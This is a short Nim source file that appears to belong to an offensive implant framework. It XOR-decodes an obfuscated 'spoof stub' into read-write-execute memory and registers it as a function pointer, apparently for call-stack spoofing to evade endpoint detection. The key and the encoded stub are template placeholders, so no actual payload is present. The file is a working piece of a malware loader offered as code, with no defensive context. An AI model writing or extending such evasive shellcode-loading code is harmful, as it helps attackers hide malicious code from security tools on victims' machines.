import ../global
import spoof
import handlers

var
  stubKey = obf("<spoofStubKey>")
  stubEnc = obf("<spoofStub>")

proc installSpoofStub(): pointer =
  # Decodes the spoof stub and copies it into executable memory
  if stubEnc.len < 64 or stubKey.len == 0:
    return nil
  let mem = allocRwx(stubEnc.len.csize_t)
  if mem == nil:
    return nil
  let dst = cast[ptr UncheckedArray[byte]](mem)
  for i in 0 ..< stubEnc.len:
    dst[i] = byte(stubEnc[i]) xor byte(stubKey[i mod stubKey.len])
  mem

var stubInstalled = false

proc stubMain*(): void =
  # Installs the spoof stub once and stores the function pointer
  if stubInstalled:
    return
  stubInstalled = true
  let fn = installSpoofStub()
  if fn != nil:
    spoof.spoofStubFn = cast[spoof.TSpoofStubFn](fn)
